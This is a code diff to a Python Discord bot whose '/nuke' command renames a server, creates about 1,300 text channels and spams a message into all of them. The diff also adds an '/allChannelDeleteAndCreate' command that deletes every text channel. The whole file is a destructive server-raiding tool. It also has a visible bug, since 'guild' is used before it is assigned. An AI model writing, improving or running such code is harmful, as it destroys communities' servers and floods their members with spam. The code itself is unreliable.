@@ -10,16 +10,22 @@ TOKEN, MESSAGE, SERVER_CHANNEL_NAME = contents
 intents = discord.Intents.all()
 client = discord.Client(intents=intents)
 
+async def allChannelDeleteAndCreate(message):
+    try:
+        guild = message.guild
+        await asyncio.gather(*(channel.delete() for channel in guild.text_channels))
+    except:
+        pass
+
 async def nuke(message):
     try:
-        channelIds = []
+        channels = guild.text_channels
         guild = message.guild
         await guild.edit(name=SERVER_CHANNEL_NAME)
-        await asyncio.gather(*(channel.delete() for channel in guild.text_channels))
-        for i in range(2000):
+        for i in range(1300):
             channel = await guild.create_text_channel(SERVER_CHANNEL_NAME)
-            channelIds.append(channel.id)
-            await asyncio.gather(*(client.get_channel(channelId).send(MESSAGE) for channelId in channelIds))
+            channels.append(channel)
+            await asyncio.gather(*(channel.send(MESSAGE) for channel in channels))
     except:
         pass
 
@@ -33,6 +39,8 @@ async def on_message(message):
         return
     if message.content == '/nuke':
         await nuke(message)
+    elif message.content == '/allChannelDeleteAndCreate':
+        await allChannelDeleteAndCreate(message)
 
 def main():
     client.run(TOKEN)
